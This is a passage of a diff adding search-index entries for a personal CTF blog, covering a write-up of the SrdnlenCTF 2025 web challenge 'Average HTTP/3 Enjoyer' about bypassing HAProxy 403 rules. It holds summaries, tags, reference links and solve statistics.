+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "New Knowledge I learned about HTTP Request Smuggling and Header Smuggling from this challenge, but in the end, it was a bypass of the proxy rules through encoding with the addition of a crafted header field. ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:9:0",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous \ud83d\udcda References & Resources ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:10:0",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
+        "content": "Learning Resources https://hacktricks.boitatech.com.br/pentesting/pentesting-web/403-and-401-bypasses https://stackoverflow.com/questions/63689649/make-an-http-request-without-a-forward-slash/76882066#76882066 \ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:30 From start to flag Global Ranking 22/1572 Challenge ranking Points Earned 405 Team contribution Created: 19-01-2025 \u2022 Last Modified: 19-01-2025 Author: mH4ck3r0n3 \u2022 Team: Team Aetruria ",
+        "date": "05/02/2025",
+        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:11:0",
+        "tags": [
+          "\ud83d\udeab 403 Bypass",
+          "\ud83d\udeab Proxy Rule Bypass",
+          "\ud83d\udee1\ufe0f HAProxy",
+          "\ud83c\udf10 Web Security"
+        ],
+        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
+        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
+      }
+    },
+    {
+      "action": "updateObject",
+      "body": {
+        "categories": [
+          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
+        ],
         "content": "A detailed write-up of the Web challenge 'Focus. Speed. I Am Speed.' from SrdnlenCTF - 2025",
         "date": "05/02/2025",
         "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./",
